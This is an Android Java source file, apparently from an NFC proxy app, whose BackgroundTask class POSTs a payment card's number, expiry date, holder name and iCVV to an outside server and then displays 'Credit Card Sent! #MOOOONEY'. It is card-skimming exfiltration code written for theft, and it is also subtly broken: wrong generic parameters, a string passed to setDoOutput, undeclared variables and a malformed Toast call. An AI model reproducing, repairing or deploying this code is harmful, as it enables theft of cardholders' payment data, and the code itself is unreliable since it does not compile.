package org.eleetas.nfc.nfcproxy;

/**
 * Created by dexter on 16-01-23.
 */
import android.content.Context;
import android.os.AsyncTask;
import android.widget.Toast;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class BackgroundTask extends AsyncTask<Void, String, String, String> {
    Context ctx;
    BackgroundTask(Context ctx)
    {
        this.ctx = ctx;
    }

    @Override
    public void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected String doInBackground(String... params){
        String reg_url = "http://mmilk.me/milk.php";

        String method = params[0];
        if(method.equals("register")){
        try{
            URL url = new URL(reg_url);
            HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
            httpURLConnection.setRequestMethod("POST");
            httpURLConnection.setDoOutput("true");
            OutputStream OS = httpURLConnection.getOutputStream();
            BufferedWriter bufferedWriter = new BufferedWriter(new OutputStreamWriter(OS,"UTF-8"));
            String data = URLEncoder.encode("cardNum","UTF-8") +" = "+URLEncoder.encode(cardNum, "UTF-8")+"&"+
            URLEncoder.encode("cardExp","UTF-8") +" = "+URLEncoder.encode(cardExp, "UTF-8")+"&"+
            URLEncoder.encode("name","UTF-8") +" = "+URLEncoder.encode(ccName, "UTF-8")+"&"+
            URLEncoder.encode("iCVV","UTF-8") +" = "+URLEncoder.encode(iCVV, "UTF-8");
            bufferedWriter.write(data);
            bufferedWriter.flush();
            bufferedWriter.close();
            OS.close();
            InputStream IS = httpURLConnection.getInputStream();
            IS.close();
            return "Credit Card Sent! #MOOOONEY";
        }
            catch (IOException e) {
                e.printStackTrace();
            }
        }
        return null;
    }

    @Override
    protected void OnProgressUpdate(Void... values) {
        super.onProgressUpdate(values);
    }

    @Override
    protected void onPostExecute (String result) {
        Toast.makeText(ctx.result.Toast.Length_Long).show();
    }
}
